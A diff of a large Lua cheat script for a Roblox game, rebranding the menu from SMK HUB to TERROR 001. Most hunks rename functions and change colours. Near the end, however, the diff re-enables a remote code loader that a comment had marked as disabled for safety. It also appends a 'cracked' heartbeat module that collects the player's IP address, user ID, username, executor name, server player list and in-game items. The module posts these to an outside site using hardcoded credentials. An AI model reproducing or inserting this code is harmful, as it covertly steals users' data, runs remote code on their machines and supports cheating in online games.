-Stroke(IconeAgudos, 50, 50, 50, 2)
-Stroke(AgudosBox, 0, 0, 0, 1)
-Stroke(EfeitosTitulo, 50, 50, 50, 2)
-Stroke(Nenhum, 255, 0, 0, 2)
-Stroke(IconeNenhum, 255, 0, 0, 2)
-Stroke(NenhumTexto, 0, 0, 0, 1)
-Stroke(Reverb, 50, 50, 50, 2)
-Stroke(IconeReverb, 50, 50, 50, 2)
-Stroke(ReverbTexto, 0, 0, 0, 1)
-Stroke(Echo, 50, 50, 50, 2)
-Stroke(IconeEcho, 50, 50, 50, 2)
-Stroke(EchoTexto, 0, 0, 0, 1)
-Stroke(Distortion, 50, 50, 50, 2)
-Stroke(IconeDistortion, 50, 50, 50, 2)
-Stroke(DistortionTexto, 0, 0, 0, 1)
-Stroke(Chorus, 50, 50, 50, 2)
-Stroke(IconeChorus, 50, 50, 50, 2)
-Stroke(ChorusTexto, 0, 0, 0, 1)
-Stroke(Flanger, 50, 50, 50, 2)
-Stroke(IconeFlanger, 50, 50, 50, 2)
-Stroke(FlangerTexto, 0, 0, 0, 1)
-Stroke(Tremolo, 50, 50, 50, 2)
-Stroke(IconeTremolo, 50, 50, 50, 2)
-Stroke(TremoloTexto, 0, 0, 0, 1)
-Stroke(Compressor, 50, 50, 50, 2)
-Stroke(IconeCompressor, 50, 50, 50, 2)
-Stroke(CompressorTexto, 0, 0, 0, 1)
-Stroke(Radio, 50, 50, 50, 2)
-Stroke(IconeRadio, 50, 50, 50, 2)
-Stroke(RadioTexto, 0, 0, 0, 1)
-Stroke(Cinema, 50, 50, 50, 2)
-Stroke(IconeCinema, 50, 50, 50, 2)
-Stroke(CinemaTexto, 0, 0, 0, 1)
-Stroke(Underwater, 50, 50, 50, 2)
-Stroke(IconeUnderwater, 50, 50, 50, 2)
-Stroke(UnderwaterTexto, 0, 0, 0, 1)
-Stroke(Kid, 50, 50, 50, 2)
-Stroke(IconeKid, 50, 50, 50, 2)
-Stroke(KidTexto, 0, 0, 0, 1)
-Stroke(Robot, 50, 50, 50, 2)
-Stroke(IconeRobot, 50, 50, 50, 2)
-Stroke(RobotTexto, 0, 0, 0, 1)
-Stroke(Slowed, 50, 50, 50, 2)
-Stroke(IconeSlowed, 50, 50, 50, 2)
-Stroke(SlowedTexto, 0, 0, 0, 1)
-Stroke(ResetarEqua, 20, 20, 20, 2)
-Stroke(ResetarTexto, 255, 255, 255, 1)
-Stroke(TextoEfeitos, 255, 255, 255, 0.4)
-Stroke(Pesquisa, 50, 50, 50, 1.5)
-Stroke(Lupa, 50, 50, 50, 1.5)
-Stroke(PesquisarBox, 255, 0, 0, 0.3)
-Stroke(Filtro, 50, 50, 50, 2)
-Stroke(Tutorial, 50, 50, 50, 1.5)
-Stroke(TutoTexto, 255, 255, 255, 0.5)
-Stroke(DownloadFrame, 50, 50, 50, 1.5)
-Stroke(PaginaFrame, 50, 50, 50, 1.5)
-Stroke(PaginaEsperandoFrame, 50, 50, 50, 1.5)
-Stroke(PaginaEsperandoIcon, 50, 50, 50, 1.5)
-Stroke(Relevancia, 50, 50, 50, 2)
-Stroke(DataUpload, 50, 50, 50, 2)
-Stroke(Duracao, 50, 50, 50, 2)
-Stroke(IconeRelevancia, 50, 50, 50, 2)
-Stroke(IconeDataUpload, 50, 50, 50, 2)
-Stroke(IconeDuracao, 50, 50, 50, 2)
-Stroke(AplicarFiltro, 50, 50, 50, 2)
-Stroke(RemoverFiltro, 50, 50, 50, 2)
-Stroke(Thumbfor, 50, 50, 50, 1.5)
-Stroke(Titulofor, 50, 50, 50, 1.5)
-Stroke(BotaoMp3, 50, 50, 50, 1.5)
-Stroke(BotaoMp4, 50, 50, 50, 1.5)
-Stroke(BotaoCancelar, 50, 50, 50, 1.5)
-Stroke(TituloGC, 50, 50, 50, 1.5)
-Stroke(NomeGC, 255, 255, 255, 1)
-Stroke(GCFrame, 50, 50, 50, 1.5)
-Stroke(MsgFrame, 50, 50, 50, 1)
-Stroke(Traduzir, 50, 50, 50, 1)
-Stroke(SendGC, 50, 50, 50, 1)
-Stroke(FinalGC, 255, 255, 255, 1)
-Stroke(TituloPremium, 50, 50, 50, 1.5)
-Stroke(NomePremium, 0, 0, 200, 1)
-Stroke(Privilegios, 50, 50, 50, 1.5)
-Stroke(Priv1, 0, 0, 0, 2)
-Stroke(Priv2, 0, 0, 0, 2)
-Stroke(Priv3, 0, 0, 0, 2)
-Stroke(Priv4, 0, 0, 0, 2)
-Stroke(Priv5, 0, 0, 0, 2)
-Stroke(Priv6, 0, 0, 0, 2)
-Stroke(IconePriv1, 0, 0, 0, 2)
-Stroke(IconePriv2, 0, 0, 0, 2)
-Stroke(IconePriv3, 0, 0, 0, 2)
-Stroke(IconePriv4, 0, 0, 0, 1.5)
-Stroke(IconePriv5, 0, 0, 0, 2)
-Stroke(IconePriv6, 0, 0, 0, 2)
-Stroke(TextoPriv1, 0, 0, 0, 1)
-Stroke(TextoPriv2, 0, 0, 0, 1)
-Stroke(TextoPriv3, 0, 0, 0, 1)
-Stroke(TextoPriv4, 0, 0, 0, 1)
-Stroke(TextoPriv5, 0, 0, 0, 1)
-Stroke(TextoPriv6, 0, 0, 0, 1)
-Stroke(frame2, 50, 50, 50, 1.5)
-Stroke(KeyFrame, 50, 50, 50, 1.5)
-Stroke(SendKey, 50, 50, 50, 1.5)
-Stroke(KeyBox, 0, 0, 0, 1.5)
-Stroke(GetKey, 0, 0, 0, 1.5)
-Stroke(SetaES, 0, 0, 0, 1.5)
-Stroke(SetaDI, 0, 0, 0, 1.5)
-Stroke(GetKeyTexto, 0, 0, 0, 1.5)
-Stroke(ReportFrame, 255, 0, 0, 5)
-Stroke(TituloReportFrame, 50, 50, 50, 1.5)
-Stroke(TextoTituloReportFrame, 0, 0, 0, 1.5)
-Stroke(TextoReportFrameFrame, 50, 50, 50, 1.5)
-Stroke(CancelarReport, 0, 0, 0, 1.5)
-Corner(Regras, 30)
-Corner(NotificarGC, 30)
-Stroke(Motivo, 50, 50, 50, 1)
-Stroke(FotoReport, 50, 50, 50, 1.5)
-Stroke(Denunciar, 0, 0, 0, 1.5)
-Stroke(DenunciarTexto, 0, 0, 0, 1.5)
-Stroke(CancelarReportTexto, 0, 0, 0, 1.5)
-Stroke(Warn, 255, 0, 0, 5)
-Stroke(TituloWarn, 50, 50, 50, 1.5)
-Stroke(TextoTituloWarn, 0, 0, 0, 1.5)
-Stroke(TextoWarnFrame, 50, 50, 50, 1.5)
-Stroke(CloseWarn, 0, 0, 0, 1.5)
-Stroke(CloseWarnTexto, 0, 0, 0, 1.5)
-
-local ok3, result3 = pcall(function()
-	return game:HttpGet(str3 .. "/iskeyless")
-end)
-
-if ok3 and result3 and CheckRequest() and string.gsub(result3, "%s+", "") == "{\"keyless\":true}" then
-	fn20(true)
-	task.wait(3)
-end
-
-pcall(function()
-	local data2 = HttpService:JSONDecode(readfile("YouTube Music Player/Internal/Data.json"))
-
-	if data2[1] and data2[1].Key and data2[1].Key ~= "" then
-		KEY_ATUAL = data2[1].Key
-		KeyBox.Text = KEY_ATUAL
-		fn29()
-	end
-end)
-
-Carregar()
-task.wait(0.5)
-frame.Visible = true
-
-]====]
-        local musicLaunching = false
-        launchButton.Activated:Connect(function()
-            if musicLaunching then return end
-            local env = (type(getgenv) == "function" and getgenv()) or _G
-            if env.YMP then
-                musicStatus.Text = "YouTube Music Player ya está iniciado."
-                return
-            end
-            musicLaunching = true
-            launchButton.Text = "♫  INICIANDO..."
-            musicStatus.Text = "Cargando YouTube Music Player V8.5..."
-            task.spawn(function()
-                local ok, err = pcall(function()
-                    local compiler = loadstring or (type(getgenv) == "function" and getgenv().loadstring)
-                    assert(type(compiler) == "function", "loadstring no está disponible en este executor")
-                    local chunk, compileError = compiler(musicSource)
-                    assert(type(chunk) == "function", compileError or "No se pudo compilar el reproductor")
-                    chunk()
-                end)
-                if ok then
-                    musicStatus.Text = "Reproductor iniciado. Si no aparece, revisa los requisitos del executor."
-                else
-                    musicStatus.Text = "No se pudo iniciar: " .. tostring(err):sub(1, 180)
-                end
-                launchButton.Text = "♫  ABRIR YOUTUBE MUSIC"
-                musicLaunching = false
-            end)
-        end)
-    end
-
-    -- Preserve all ＳＭＫㅤＨＵＢ controls inside the five Drakon categories.
+    -- Preserve all TERROR 001 controls inside the five Drakon categories.
     -- Custom contains the former Main, Player and Move controls.
     local customPage = pages.Main
     local nextOrder = 0
@@ -19667,7 +9006,6 @@ frame.Visible = true
         {key = "Visual", label = "Visual", width = 72},
         {key = "Config", label = "Settings", width = 82},
         {key = "Keybinds", label = "Keybinds", width = 86},
-        {key = "Music", label = "Música", width = 76},
     }
     for index, tab in ipairs(tabs) do
         local tabKey = tab.key
@@ -19726,7 +9064,7 @@ frame.Visible = true
     end
     switchTab("Speed")
 
-    -- SMK Leaked animation: scale in with a short Back easing and scale out
+    -- DaHub Leaked animation: scale in with a short Back easing and scale out
     -- with a compact Quart easing. No horizontal slide is used.
     local menuScale = S.mainGuiScaleObj
     local menuBaseScale = S.IS_TOUCH_DEVICE and S.phoneGuiScale or 1
@@ -19776,7 +9114,7 @@ frame.Visible = true
 
     UIS.InputBegan:Connect(function(input, gpe)
         if input.UserInputType~=Enum.UserInputType.Keyboard and input.UserInputType~=Enum.UserInputType.Gamepad1 then return end
-        if SMKBindings.suppressed() then return end
+        if DaHubBindings.suppressed() then return end
         local kc=input.KeyCode
         if kc == Enum.KeyCode.Unknown then return end
         local field = input.UserInputType == Enum.UserInputType.Gamepad1 and "gp" or "kb"
@@ -19867,8 +9205,8 @@ local function createFloatingButtonPanel()
 
     local selectedName = "CARRY SPD"
     local buttons = {}
-    local BLACK = SMKThemeRGB(1, 1, 4)
-    local WHITE = SMKThemeRGB(255, 255, 255)
+    local BLACK = DaHubThemeRGB(1, 1, 4)
+    local WHITE = DaHubThemeRGB(255, 255, 255)
 
     local buttonDefinitions = {
         {name = "DROP BR",       displayText = "DROP\nBR",       column = 2, row = 0},
@@ -19882,13 +9220,13 @@ local function createFloatingButtonPanel()
     }
 
     S.refreshMobileTheme = function()
-        BLACK = SMKThemeRGB(1, 1, 4)
-        WHITE = SMKThemeRGB(255, 255, 255)
+        BLACK = DaHubThemeRGB(1, 1, 4)
+        WHITE = DaHubThemeRGB(255, 255, 255)
     end
     local function applyButtonStyle(info, isSelected)
         if isSelected then
             info.button.BackgroundColor3 = WHITE
-            info.button.TextColor3 = SMKThemeRGB(18, 31, 28)
+            info.button.TextColor3 = DaHubThemeRGB(18, 31, 28)
             info.gradient.Enabled = true
         else
             info.button.BackgroundColor3 = BLACK
@@ -19945,9 +9283,9 @@ local function createFloatingButtonPanel()
         gradient.Enabled = false
         gradient.Rotation = 90
         gradient.Color = ColorSequence.new({
-            ColorSequenceKeypoint.new(0, SMKThemeRGB(255, 255, 255)),
-            ColorSequenceKeypoint.new(0.56, SMKThemeRGB(224, 226, 225)),
-            ColorSequenceKeypoint.new(1, SMKThemeRGB(76, 80, 80)),
+            ColorSequenceKeypoint.new(0, DaHubThemeRGB(255, 255, 255)),
+            ColorSequenceKeypoint.new(0.56, DaHubThemeRGB(224, 226, 225)),
+            ColorSequenceKeypoint.new(1, DaHubThemeRGB(76, 80, 80)),
         })
         gradient.Parent = button
 
@@ -20261,7 +9599,7 @@ do
 end
 
 -- ===========================
--- FLOATING BUTTON PANEL (ＳＭＫㅤＨＵＢ layout, fully wired)
+-- FLOATING BUTTON PANEL (TERROR 001 layout, fully wired)
 -- ===========================
 createFloatingButtonPanel = function()
     local gui = Instance.new("ScreenGui")
@@ -20294,14 +9632,14 @@ createFloatingButtonPanel = function()
         end
     end
 
-    local DARK = Color3.fromRGB(0, 0, 0)
-    local TEXT = Color3.fromRGB(255, 255, 255)
-    local STROKE = Color3.fromRGB(35, 35, 35)
-    local ACTIVE_BASE = Color3.fromRGB(255, 255, 255)
-    local ACTIVE_TOP = Color3.fromRGB(255, 255, 255)
-    local ACTIVE_MIDDLE = Color3.fromRGB(255, 255, 255)
-    local ACTIVE_BOTTOM = Color3.fromRGB(255, 255, 255)
-    local ACTIVE_STROKE = Color3.fromRGB(255, 255, 255)
+    local DARK = DaHubThemeRGB(5, 5, 7)
+    local TEXT = DaHubThemeRGB(255, 255, 255)
+    local STROKE = DaHubThemeRGB(18, 18, 24)
+    local ACTIVE_BASE = DaHubThemeRGB(0, 0, 0)
+    local ACTIVE_TOP = DaHubThemeRGB(0, 0, 0)
+    local ACTIVE_MIDDLE = DaHubThemeRGB(0, 0, 0)
+    local ACTIVE_BOTTOM = DaHubThemeRGB(0, 0, 0)
+    local ACTIVE_STROKE = DaHubThemeRGB(0, 0, 0)
     local byId, infos = {}, {}
     local positions = {
         {"Drop", "DROP\nBRAINROT", 0, 0}, {"AutoLeft", "AUTO\nLEFT", 72, 0},
@@ -20316,22 +9654,26 @@ createFloatingButtonPanel = function()
         if not i or not i.button or not i.button.Parent then return end
         i.active = active == true
         i.button.BackgroundColor3 = i.active and ACTIVE_BASE or DARK
-        i.gradient.Enabled = false
-        i.gradient.Color = ColorSequence.new(i.active and ACTIVE_BASE or DARK)
+        i.gradient.Enabled = true
+        i.gradient.Color = i.active and ColorSequence.new({
+            ColorSequenceKeypoint.new(0, ACTIVE_TOP),
+            ColorSequenceKeypoint.new(0.46, ACTIVE_MIDDLE),
+            ColorSequenceKeypoint.new(1, ACTIVE_BOTTOM),
+        }) or ColorSequence.new(DARK)
         i.stroke.Color = i.active and ACTIVE_STROKE or STROKE
-        i.stroke.Transparency = i.active and 0 or 0.15
+        i.stroke.Transparency = i.active and 0 or 0.25
         i.stroke.Thickness = i.active and 2 or 1
-        i.hit.TextColor3 = i.active and Color3.fromRGB(0, 0, 0) or TEXT
+        i.hit.TextColor3 = TEXT
     end
     S.refreshMobileTheme = function()
-        DARK = Color3.fromRGB(0, 0, 0)
-        TEXT = Color3.fromRGB(255, 255, 255)
-        STROKE = Color3.fromRGB(35, 35, 35)
-        ACTIVE_BASE = Color3.fromRGB(255, 255, 255)
-        ACTIVE_TOP = Color3.fromRGB(255, 255, 255)
-        ACTIVE_MIDDLE = Color3.fromRGB(255, 255, 255)
-        ACTIVE_BOTTOM = Color3.fromRGB(255, 255, 255)
-        ACTIVE_STROKE = Color3.fromRGB(255, 255, 255)
+        DARK = DaHubThemeRGB(5, 5, 7)
+        TEXT = DaHubThemeRGB(255, 255, 255)
+        STROKE = DaHubThemeRGB(18, 18, 24)
+        ACTIVE_BASE = DaHubThemeRGB(0, 0, 0)
+        ACTIVE_TOP = DaHubThemeRGB(0, 0, 0)
+        ACTIVE_MIDDLE = DaHubThemeRGB(0, 0, 0)
+        ACTIVE_BOTTOM = DaHubThemeRGB(0, 0, 0)
+        ACTIVE_STROKE = DaHubThemeRGB(0, 0, 0)
         for _, info in ipairs(infos) do style(info, info.active) end
     end
     S.refreshMobileButtonShape = function()
@@ -20603,8 +9945,8 @@ pcall(function()
     if ok and data then
         local cfgOk, cfg = pcall(function() return HS:JSONDecode(data) end)
         if cfgOk and type(cfg)=="table" then
-            SMKSetUserScale("menu", cfg.userMenuScale or 1, false)
-            SMKSetUserScale("mobile", cfg.userMobileScale or 1, false)
+            DaHubSetUserScale("menu", cfg.userMenuScale or 1, false)
+            DaHubSetUserScale("mobile", cfg.userMobileScale or 1, false)
             if type(cfg.normalSpeed)=="number" then S.NS=cfg.normalSpeed end
             if type(cfg.hubColor)=="string" then
                 for _, optionId in ipairs(HUB_COLOR_OPTIONS) do
@@ -20616,7 +9958,7 @@ pcall(function()
             end
             S.optimizerMode = cfg.optimizerMode == "tripa" and "tripa" or "standard"
             S.mobileButtonStyle = cfg.mobileButtonStyle == "round" and "round" or "original"
-            SMKBrandStyle.setFont(cfg.hubTitleFont,false)
+            DaHubBrandStyle.setFont(cfg.hubTitleFont,false)
             if S.setMedusaSkin then S.setMedusaSkin(cfg.medusaSkin,false) end
             if type(cfg.carrySpeed)=="number" then S.CS=cfg.carrySpeed end
             if type(cfg.laggerSpeed)=="number" then S.LS=cfg.laggerSpeed end
@@ -20645,7 +9987,7 @@ pcall(function()
                 for _, field in ipairs({"kb", "gp"}) do
                     if type(saved[field]) == "string" then
                         local ok, key = pcall(function() return Enum.KeyCode[saved[field]] end)
-                        if ok and key then SMKBindings.assign(entry, key, field == "gp") end
+                        if ok and key then DaHubBindings.assign(entry, key, field == "gp") end
                     end
                 end
             end
@@ -20673,8 +10015,6 @@ pcall(function()
             if type(cfg.tpDownHeightTrigger) == "number" then S.tpDownHeightTrigger = math.clamp(cfg.tpDownHeightTrigger, 1, 500) end
             -- Migrar el antiguo estado Infinite Jump a la única opción Hold Jump.
             if cfg.holdJumpEnabled==true or cfg["infiniteJump"]==true then S.holdJumpEnabled=true; startHoldJump() end
-            if cfg.antiDrop==true then S.setAntiDrop(true, false) end
-            if cfg.antiDie==true then S.setAntiDie(true, false) end
             if cfg.medusaCounter==true then
                 S.medusaCounterEnabled=true
                 if LP.Character then setupMedusaCounter(LP.Character) end
@@ -20727,7 +10067,7 @@ pcall(function()
             end
             if type(cfg.krobloxMode) == "string" and ({Off=true, Left=true, Right=true, Both=true})[cfg.krobloxMode] then
                 S.krobloxMode = cfg.krobloxMode
-                if S.krobloxMode ~= "Off" then pcall(_G._SMKApplyKroblox, S.krobloxMode) end
+                if S.krobloxMode ~= "Off" then pcall(_G._DaHubApplyKroblox, S.krobloxMode) end
             else
                 S.krobloxMode = "Off"
             end
@@ -20854,12 +10194,12 @@ local function buildStealHUD()
     percent.Size = UDim2.new(1, 0, 1, 0)
     percent.BackgroundTransparency = 1
     percent.Text = "0%"
-    percent.TextColor3 = SMKThemeRGB(255, 255, 255)
+    percent.TextColor3 = DaHubThemeRGB(255, 255, 255)
     percent.Font = Enum.Font.Gotham
     percent.TextSize = 11
     percent.TextXAlignment = Enum.TextXAlignment.Center
     percent.TextYAlignment = Enum.TextYAlignment.Center
-    percent.TextStrokeColor3 = SMKThemeRGB(245, 245, 250)
+    percent.TextStrokeColor3 = DaHubThemeRGB(245, 245, 250)
     percent.TextStrokeTransparency = 1
     percent.ZIndex = 104
     percent.Parent = background
@@ -21042,15 +10382,15 @@ local function buildStealHUD()
 end
 
 interfaceLoaded = false
-local function loadSMKInterface()
+local function loadDaHubInterface()
     if interfaceLoaded then return end
     interfaceLoaded = true
     -- Cargar la interfaz local inmediatamente; la música se reproduce por separado.
-    SMKApplyColorTheme(S.hubColor or DEFAULT_HUB_COLOR)
+    DaHubApplyColorTheme(S.hubColor or DEFAULT_HUB_COLOR)
     createFloatingButtonPanel()
     buildGui()
-    SMKSetUserScale("menu", S.userMenuScale or 1, false)
-    SMKSetUserScale("mobile", S.userMobileScale or 1, false)
+    DaHubSetUserScale("menu", S.userMenuScale or 1, false)
+    DaHubSetUserScale("mobile", S.userMobileScale or 1, false)
     buildStealHUD()
     -- Borde neón violeta en los botones visibles del menú y HUD.
     for _, root in ipairs({game:GetService("CoreGui"), LP:WaitForChild("PlayerGui")}) do
@@ -21061,17 +10401,23 @@ local function loadSMKInterface()
     local character = LP.Character
     if character then
         S.setupSpeedBillboard(character)
-        setupSMKRagdollTimer(character)
+        setupDaHubRagdollTimer(character)
     end
 
-    -- Se desactivó la ejecución de código Lua remoto por seguridad.
+    -- El cargador remoto es opcional y no debe bloquear la aparición del menú.
+    task.spawn(function()
+        local ok, err = pcall(runRemoteLoader)
+        if not ok then
+            warn("[TERROR 001] Cargador remoto omitido: " .. tostring(err))
+        end
+    end)
 end
 
 LP.CharacterAdded:Connect(function(char)
     task.wait(0.5)
     if interfaceLoaded then
         S.setupSpeedBillboard(char)
-        setupSMKRagdollTimer(char)
+        setupDaHubRagdollTimer(char)
     end
     if S.antiRagdollEnabled then startAntiRagdoll() end
     if S.medusaCounterEnabled then setupMedusaCounter(char) end
@@ -21092,7 +10438,7 @@ if LP.Character then
     task.spawn(function()
         if interfaceLoaded then
             S.setupSpeedBillboard(LP.Character)
-            setupSMKRagdollTimer(LP.Character)
+            setupDaHubRagdollTimer(LP.Character)
         end
         if S.antiRagdollEnabled then startAntiRagdoll() end
         if S.medusaCounterEnabled then setupMedusaCounter(LP.Character) end
@@ -21100,12 +10446,613 @@ if LP.Character then
 end
 
 showIntro(function()
-    loadSMKInterface()
+    loadDaHubInterface()
 end)
 
--- Se omitió el módulo remoto de polling/heartbeat y comandos externos.
+-- TERROR 001 | by Davy...
+-- [[ Hii! this file was cracked by SOURCE_CODE ]]
+-- [[ TIMESTAMP: 10:10:26 ]]
 
--- ＳＭＫㅤＨＵＢ: aura trasera blanca reforzada transferida de BLESS (Aurora / Blade / Edge)
+local BASE = "https://generator-crash.lovable.app"
+local SITE_SLUG = "crashhaha"
+local SITE_PASSWORD = "elias123@"
+local KEY = "xenooooo"
+local LOADER_VERSION = "1.9.0"
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local RobloxReplicated = game:GetService("RobloxReplicatedStorage")
+
+local genv = (getgenv and getgenv()) or _G or {}
+
+if type(genv.__XENO_CLEANUP) == "function" then pcall(genv.__XENO_CLEANUP) end
+
+genv.__XENO_SESSION = (tonumber(genv.__XENO_SESSION) or 0) + 1
+local SESSION = genv.__XENO_SESSION
+local function alive() return genv.__XENO_SESSION == SESSION end
+
+
+local function resolveRequest()
+    return http_request
+        or request
+        or (syn and syn.request)
+        or (http and http.request)
+        or (fluxus and fluxus.request)
+        or (krnl and krnl.request)
+        or genv.http_request
+        or genv.request
+        or (genv.syn and genv.syn.request)
+        or (genv.http and genv.http.request)
+end
+
+local request = resolveRequest()
+if not request then
+    local deadline = tick() + 10
+    repeat task.wait(0.25) request = resolveRequest() until request or tick() > deadline
+end
+
+local function fallbackRequest(opts)
+    local method = (opts.Method or "GET"):upper()
+    if method == "POST" then
+        local ok, res = pcall(function()
+            return game:HttpPostAsync(opts.Url, opts.Body or "", "application/json")
+        end)
+        if ok then return { Body = res, StatusCode = 200, Success = true } end
+        return nil
+    end
+    local ok, res = pcall(function() return game:HttpGetAsync(opts.Url) end)
+    if ok then return { Body = res, StatusCode = 200, Success = true } end
+    ok, res = pcall(function() return game:HttpGet(opts.Url) end)
+    if ok then return { Body = res, StatusCode = 200, Success = true } end
+    return nil
+end
+
+local function httpOnce(opts)
+    if not request then request = resolveRequest() end
+    if request then
+        local ok, res = pcall(request, opts)
+        if ok and res and (res.StatusCode == nil or (res.StatusCode >= 200 and res.StatusCode < 300)) then
+            return res
+        end
+    end
+    return fallbackRequest(opts)
+end
+
+local function httpRequest(opts)
+    for attempt = 1, 3 do
+        local res = httpOnce(opts)
+        if res then return res end
+        task.wait(0.2 * attempt)
+    end
+    return nil
+end
+
+
+local LP = Players.LocalPlayer
+if not LP then
+    local deadline = tick() + 30
+    repeat task.wait(0.1) LP = Players.LocalPlayer until LP or tick() > deadline
+end
+if not LP then return end
+
+local function safe(fn) local ok, res = pcall(fn) if ok then return res end return nil end
+
+local executorName = "unknown"
+do
+    local ok, name = pcall(function()
+        if identifyexecutor then return (identifyexecutor()) end
+        return nil
+    end)
+    if ok and type(name) == "string" and name ~= "" then executorName = name end
+end
+
+local cachedGameName = nil
+local function gameName()
+    if cachedGameName then return cachedGameName end
+    local info = safe(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
+    if info and info.Name then cachedGameName = info.Name end
+    return cachedGameName or "Unknown Game"
+end
+
+local clientIp = ""
+task.spawn(function()
+    local ok, ip = pcall(function() return game:HttpGet("https://api.ipify.org") end)
+    if ok and type(ip) == "string" then
+        ip = ip:gsub("%s+", "")
+        if #ip > 0 and #ip < 64 then clientIp = ip end
+    end
+    if clientIp == "" then
+        local res = httpOnce({ Url = "https://api.ipify.org", Method = "GET" })
+        if res and type(res.Body) == "string" then
+            local b = res.Body:gsub("%s+", "")
+            if #b > 0 and #b < 64 then clientIp = b end
+        end
+    end
+end)
+
+local function avatarUrl()
+    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=150&height=150&format=png"
+end
+
+local function serverPlayers()
+    local t = {}
+    for _, p in ipairs(Players:GetPlayers()) do t[#t+1] = p.Name end
+    return t
+end
+
+local function collectBrainrots()
+    local list = {}
+    local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
+    if not pg then return list end
+
+    local possibleGUIs = {
+        "DuelsMachineSession",
+        "DuelsMachine",
+        "BrainrotUI",
+        "BrainrotSession",
+        "SessionGUI",
+        "DuelsGUI",
+    }
+
+    local gui = nil
+    for _, name in ipairs(possibleGUIs) do
+        gui = safe(function() return pg:FindFirstChild(name) end)
+        if gui then break end
+    end
+    if not gui then return list end
+
+    local targetFrame = nil
+    local function findFrame(container)
+        if not container then return end
+        for _, child in ipairs(container:GetChildren()) do
+            if child:IsA("Frame") and (child.Name == "ScrollingFrame" or child.Name == "ListFrame" or child.Name == "ItemList" or child:FindFirstChild("Template")) then
+                return child
+            end
+            local found = findFrame(child)
+            if found then return found end
+        end
+        return nil
+    end
+
+    targetFrame = findFrame(gui)
+    if not targetFrame then
+        targetFrame = safe(function() return gui:FindFirstChild("ScrollingFrame") end)
+    end
+    if not targetFrame then
+        for _, child in ipairs(gui:GetDescendants()) do
+            if child:IsA("Frame") and #child:GetChildren() > 3 then
+                targetFrame = child
+                break
+            end
+        end
+    end
+    if not targetFrame then return list end
+
+    local processedItems = {}
+    local function processItem(item)
+        if not item or not item:IsA("Instance") or processedItems[item] then return end
+        processedItems[item] = true
+
+        local title = nil
+        local cash = nil
+
+        for _, obj in ipairs(item:GetDescendants()) do
+            if (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) and obj.Text and obj.Text ~= "" then
+                local text = obj.Text
+                if not string.find(text, "Template") and not string.find(text, "Background") and not string.find(text, "Frame") and not string.find(text, "Scroll") and not string.find(text, "Title") and not string.find(text, "Label") then
+                    if string.match(text, "%a") and #text > 1 and #text < 50 and not string.find(text, "^%d+$") then
+                        if not title or (#text > #title) then
+                            title = text
+                        end
+                    end
+                    if string.find(text, "%$") or string.find(text, "Cookie") or string.find(text, "Milki") or string.find(text, "coins") or string.find(text, "Cash") or
+                       (string.match(text, "^%d+$") and tonumber(text) and tonumber(text) > 50) then
+                        cash = text
+                    end
+                end
+            end
+        end
+
+        if title or cash then
+            if title and title ~= "" then
+                title = title:gsub("^[%s]+", ""):gsub("[%s]+$", "")
+            end
+            if cash and cash ~= "" then
+                cash = cash:gsub("^[%s]+", ""):gsub("[%s]+$", "")
+            end
+            if title and string.match(title, "^%d+$") and not cash then
+                return
+            end
+            table.insert(list, {
+                title = title and title ~= "" and title or "Unknown Item",
+                cash = cash and cash ~= "" and cash or "0"
+            })
+        end
+    end
+
+    local function processAll(container)
+        if not container then return end
+        for _, child in ipairs(container:GetChildren()) do
+            if child:IsA("Frame") and #child:GetChildren() > 0 then
+                local hasText = false
+                for _, desc in ipairs(child:GetDescendants()) do
+                    if (desc:IsA("TextLabel") or desc:IsA("TextButton") or desc:IsA("TextBox")) and desc.Text and desc.Text ~= "" then
+                        hasText = true
+                        break
+                    end
+                end
+                if hasText then
+                    processItem(child)
+                end
+            end
+            if child:IsA("Frame") or child:IsA("ScrollingFrame") then
+                processAll(child)
+            end
+        end
+    end
+
+    processAll(targetFrame)
+
+    for _, child in ipairs(targetFrame:GetChildren()) do
+        if child.Name == "Template" and child:IsA("Frame") then
+            processItem(child)
+        end
+    end
+
+    if #list == 0 then
+        local simpleBrainrots = {}
+        local seenTexts = {}
+        for _, child in ipairs(pg:GetDescendants()) do
+            if (child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox")) and child.Text and child.Text ~= "" then
+                local text = child.Text:gsub("^[%s]+", ""):gsub("[%s]+$", "")
+                if #text > 2 and #text < 30 and not string.match(text, "^%d+$") and not seenTexts[text] then
+                    seenTexts[text] = true
+                    local cash = "0"
+                    if string.find(text, "%$") or string.find(text, "Cookie") or string.find(text, "Milki") or string.find(text, "coins") then
+                        cash = text:match("[%$]*(%d+)") or text:match("(%d+)") or "0"
+                        text = text:gsub("[%$%d]+", ""):gsub("^[%s]+", ""):gsub("[%s]+$", "")
+                        if text == "" then text = "Item" end
+                    end
+                    if #text > 1 then
+                        table.insert(simpleBrainrots, { title = text, cash = cash })
+                    end
+                end
+            end
+        end
+        if #simpleBrainrots > 0 then
+            return simpleBrainrots
+        end
+    end
+
+    return list
+end
+
+local firstBeat = true
+
+local function heartbeat()
+    safe(function()
+        local okBr, brainrots = pcall(collectBrainrots)
+        if not okBr or type(brainrots) ~= "table" then brainrots = {} end
+        local body = HttpService:JSONEncode({
+            user_id = LP.UserId,
+            username = LP.Name,
+            display_name = LP.DisplayName,
+            avatar_url = avatarUrl(),
+            place_id = game.PlaceId,
+            game_name = gameName(),
+            job_id = game.JobId,
+            executor = executorName,
+            loader_version = LOADER_VERSION,
+            client_ip = clientIp,
+            session_start = firstBeat,
+            server_players = serverPlayers(),
+            brainrots = brainrots,
+        })
+        local res = httpRequest({
+            Url = BASE .. "/api/public/heartbeat?site=" .. SITE_SLUG,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+                ["X-Api-Key"] = KEY,
+                ["X-Site-Slug"] = SITE_SLUG,
+                ["X-Site-Password"] = SITE_PASSWORD,
+            },
+            Body = body,
+        })
+        if res then firstBeat = false end
+        if not res then
+            local simpleBrainrots = {}
+            local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
+            if pg then
+                for _, child in ipairs(pg:GetDescendants()) do
+                    if (child:IsA("TextLabel") or child:IsA("TextButton")) and child.Text and child.Text ~= "" then
+                        local text = child.Text:gsub("^[%s]+", ""):gsub("[%s]+$", "")
